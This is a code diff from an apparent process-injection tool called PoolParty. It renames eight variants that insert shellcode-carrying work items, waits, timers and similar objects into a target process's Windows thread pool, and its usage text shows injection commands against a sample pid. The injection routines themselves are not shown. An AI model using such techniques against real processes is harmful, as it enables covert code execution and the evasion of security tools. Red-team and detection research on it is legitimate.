@@ -27,17 +27,17 @@ void PrintUsage()
 		"VARIANTS:" << std::endl <<
 		"------" << std::endl << std::endl <<
 		"#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
-		"#2: (RemoteWorkItemInsertion) " << std::endl << "\t+ Insert work item (TP_WORK) to the target process's thread pool" << std::endl << std::endl <<
-		"#3: (RemoteWaitCallbackInsertion) " << std::endl << "\t+ Insert wait (TP_WAIT) to the target process's thread pool" << std::endl << std::endl <<
-		"#4: (RemoteIoCompletionCallbackInsertion) " << std::endl << "\t+ Insert IO completion (TP_IO) to the target process's thread pool" << std::endl << std::endl <<
-		"#5: (RemoteAlpcCallbackInsertion) " << std::endl << "\t+ Insert ALPC (TP_ALPC) to the target process's thread pool" << std::endl << std::endl <<
-		"#6: (RemoteJobCallbackInsertion) " << std::endl << "\t+ Insert job (TP_JOB) to the target process's thread pool" << std::endl << std::endl << std::endl <<
-		"#7: (RemoteDirectCallbackInsertion) " << std::endl << "\t+ Insert direct (TP_DIRECT) to the target process's thread pool" << std::endl << std::endl << std::endl <<
-		"#8: (RemoteTimerCallbackInsertion) " << std::endl << "\t+ Insert timer (TP_TIMER) to the target process's thread pool" << std::endl << std::endl << std::endl <<
+		"#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
+		"#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
+		"#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
+		"#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
+		"#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
+		"#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
+		"#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
 		"EXAMPLES:" << std::endl <<
 		"------" << std::endl << std::endl <<
-		"#1 RemoteWorkItemInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
-		"#2 RemoteIoCompletionCallbackInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
+		"#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
+		"#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
 }
 
 POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
@@ -82,19 +82,19 @@ std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 	case 1: 
 		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 2:
-		return std::make_unique<RemoteWorkItemInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 3:
-		return std::make_unique<RemoteWaitCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpWaitInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 4:
-		return std::make_unique<RemoteIoCompletionCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpIoInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 5:
-		return std::make_unique<RemoteAlpcCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 6:
-		return std::make_unique<RemoteJobCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpJobInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 7:
-		return std::make_unique<RemoteDirectCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpDirectInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 8:
-		return std::make_unique<RemoteTimerCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
+		return std::make_unique<RemoteTpTimerInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	default:
 		PrintUsage();
 		throw std::runtime_error("Invalid variant ID");
